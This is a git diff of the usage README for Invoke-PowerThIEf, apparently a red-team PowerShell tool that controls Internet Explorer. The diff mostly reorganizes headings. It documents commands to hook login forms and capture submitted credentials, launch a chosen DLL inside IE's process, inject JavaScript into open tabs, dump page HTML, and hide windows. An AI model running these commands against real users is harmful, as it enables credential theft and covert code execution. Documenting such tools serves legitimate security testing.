@@ -27,12 +27,25 @@ First import the module using . .\Invoke-PowerThIEf.ps1 then use any of the foll
 Invoke-PowerThIEf -action ListUrls
 ```
 
+## Capturing credentials in transit
+### Automatically scan any windows or tabs for login forms and then record what gets posted. A notification will appear when some have arrived.
+```
+Invoke-PowerThIEf -action HookLoginForms 
+```
+
+### List any creds that have been captured. 
+```
+Invoke-PowerThIEf -action Creds 
+```
+
+## Make IExplore.exe launch a DLL of your chooising (must be x64)
 ### Launch the DLL(x64) specified by the PathPayload param in IE's process
 ```
 Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>
 ```
 
-### Invoke the JavaScript in all currently opened IE windows and tabs
+## Invoking JavaScript
+### Invoke JavaScript in all currently opened IE windows and tabs
 ```
 Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>
 
@@ -44,43 +57,45 @@ Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'
 Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script\<JavaScript to run>
 ```
 
-### Dump the HTML of all currently opened IE windows/tabs
+## Dumping HTML
+### Dump HTML from all currently opened IE windows/tabs
 ```
 Invoke-PowerThIEf -action DumpHtml
 ```
 
-### Dump the HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Dump HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
 ```
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>
 ```
 
-### Dump the HTML from all tags of \<type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Dump HTML from all tags of \<type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
 ```
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>
 
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div
 ```
 
-### Dump the HTML from any tag with the \<id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Dump HTML from any tag with the \<id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
 ```
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>
 
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv
 ```
 
-### Dump the HTML from any tag with the \<name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Dump HTML from any tag with the \<name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
 ```
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>
 
 Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv
 ```
 
+## Showing/Hiding Windows
 ### Set to visible all IE windows/tabs
 ```
 Invoke-PowerThIEf -action ShowWindow
 ```
 
-### Show the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Set the selected window/tab to be visible. 
 ```
 Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>
 ```
@@ -90,13 +105,15 @@ Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>
 Invoke-PowerThIEf -action HideWindow
 ```
 
-### Hide the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
+### Hide the selected window/tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
 ```
 Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>
 ```
 
+## Navigating the browser
 ### Navigate all currently opened IE windows/tabs to the \<URL>
-```Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 
+```
+Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 
 ```
 
 ### Navigate all currently opened IE windows/tabs to the \<URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
@@ -109,16 +126,7 @@ Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <UR
 Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 
 ```
 
-### Automatically scan any windows or tabs for login forms and record what gets posted. Once credentials have come in use -action creds to list them
-```
-Invoke-PowerThIEf -action HookLoginForms 
-```
-
-### List any creds that have been captured
-```
-Invoke-PowerThIEf -action Creds 
-```
-
+## Background tabs
 ### Open a new background tab in the window that the \<BrowserIndex> is in.
 ```
 Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>
